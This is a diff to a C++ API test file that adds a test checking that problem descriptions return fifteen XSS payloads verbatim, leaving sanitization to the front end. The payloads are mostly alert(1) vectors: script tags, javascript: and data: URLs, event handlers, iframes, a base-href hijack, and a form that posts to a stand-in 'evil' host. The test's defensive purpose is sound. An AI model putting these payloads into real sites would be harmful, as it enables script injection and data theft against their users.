@@ -33,7 +33,11 @@
 //       * 200 ordering on tags    - name ASC
 //       * 200 description is delivered RAW (no XSS sanitization in
 //         the API layer; SPEC §6.3 + A32 puts the burden on the
-//         front-end DOMPurify pass)
+//         front-end DOMPurify pass). Includes the full battery of
+//         adversarial payloads from SPEC §6.3 / A32: inline <script>,
+//         <iframe>, javascript:/data: URLs, event handlers, CSS
+//         expressions, <object>/<embed>, <base href> hijack, mixed-
+//         case and entity-encoded variants.
 //       * 404 slug not found
 //       * 404 soft-deleted problem is NEVER returned (public path
 //         forces include_deleted=false)
@@ -853,6 +857,83 @@ TEST_F(ProblemDetailLiveFixture, DescriptionDeliveredRaw) {
     const auto body = nlohmann::json::parse(r.body);
     // Raw bytes round-trip; the sanitization is the front-end's job.
     EXPECT_EQ(body["data"]["description"], description);
+}
+
+// Phase 5 ★ Markdown XSS 净化 / SPEC §6.3 + A32 — the API must NOT
+// strip XSS payloads from `description`. The sanitization contract
+// is "deliver raw Markdown, the browser's DOMPurify pass is
+// responsible for safety". The test below walks the full battery
+// of adversarial payloads from SPEC §6.3 + A32. If a future
+// "helpful" change moves sanitization into the API layer (a
+// regression: it'd force every API consumer to know the
+// sanitization policy and make CSP/SRI a false floor), this test
+// pins the contract.
+TEST_F(ProblemDetailLiveFixture, DescriptionPreservesAdversarialPayloads) {
+    StdoutSilencer silencer;
+    // Each payload is a real attack vector an admin (or a
+    // compromised admin session) might paste into a problem
+    // description. The API must echo all of them verbatim. The
+    // DOMPurify pass in web/js/markdown.js is responsible for
+    // turning them into safe HTML.
+    const std::vector<std::pair<std::string, std::string>> cases = {
+        // 1) inline <script> — the canonical XSS test.
+        {"inline-script",  "<script>alert('xss')</script>"},
+        // 2) mixed-case bypass — some naive HTML parsers only
+        //    block <script> and not <ScRiPt>.
+        {"mixed-case",     "<ScRiPt>alert(1)</ScRiPt>"},
+        // 3) entity-encoded script tag — the server doesn't
+        //    decode entities so this round-trips as the literal
+        //    "&lt;script&gt;" string the admin typed.
+        {"entity-encoded", "&lt;script&gt;alert(1)&lt;/script&gt;"},
+        // 4) javascript: URL inside Markdown link syntax.
+        {"js-link",        "[click](javascript:alert(1))"},
+        // 5) data: URL with text/html — would render HTML in a
+        //    naive iframe.
+        {"data-html",      "[click](data:text/html,<script>alert(1)</script>)"},
+        // 6) vbscript: URL (legacy IE vector, but pinned).
+        {"vbscript",       "[click](vbscript:msgbox(1))"},
+        // 7) inline event handler on a real anchor.
+        {"onclick",        "<a href=\"https://x\" onclick=\"alert(1)\">x</a>"},
+        // 8) <iframe> — full embed of a hostile page.
+        {"iframe",         "<iframe src=\"https://evil/\"></iframe>"},
+        // 9) <object> + <embed> — flash / mime sniffing vectors.
+        {"object-embed",   "<object data=\"x.swf\"></object><embed src=\"x\">"},
+        // 10) form auto-submit — POSTs to attacker.
+        {"form-submit",    "<form action=\"https://evil/steal\"><input name=cc>"},
+        // 11) <base href> hijack — would re-target every relative
+        //     URL on the page (CSP blocks this, but the API
+        //     contract is "deliver raw").
+        {"base-hijack",    "<base href=\"https://evil/\">"},
+        // 12) CSS expression — legacy IE vector.
+        {"css-expression", "<div style=\"background:expression(alert(1))\">x</div>"},
+        // 13) <style> tag — could exfil via attribute selectors.
+        {"style-tag",      "<style>body{background:url(javascript:alert(1))}</style>"},
+        // 14) onerror on an image — fires when the image fails
+        //     to load.
+        {"img-onerror",    "<img src=x onerror=\"alert(1)\">"},
+        // 15) HTML comment injection — IE conditional comments
+        //     don't apply to HTML5, but we pin that the API
+        //     doesn't mangle the comment.
+        {"ie-comment",     "<!--[if IE]><script>alert(1)</script><![endif]-->"},
+    };
+
+    for (const auto& c : cases) {
+        const std::string& name = c.first;
+        const std::string& payload = c.second;
+        const std::string slug = fresh_slug(name.c_str());
+        const int pid = seed_problem(slug, "easy", "adv " + name, payload);
+        ASSERT_GT(pid, 0) << "seed_problem failed for case: " << name;
+
+        const auto r = do_get(handle, "/api/v1/problems/" + slug);
+        ASSERT_TRUE(r.ok)        << "GET failed for case: " << name;
+        ASSERT_EQ(r.status, 200) << "non-200 for case: " << name;
+        const auto body = nlohmann::json::parse(r.body);
+        // The contract: the API echoes the raw payload verbatim.
+        // Sanitization is the front-end's job (web/js/markdown.js
+        // + DOMPurify + the CSP/SRI pins in web/js/csp.js).
+        EXPECT_EQ(body["data"]["description"], payload)
+            << "API tampered with description for case: " << name;
+    }
 }
 
 // ────────────────────────────────────────────────────────────────────────────
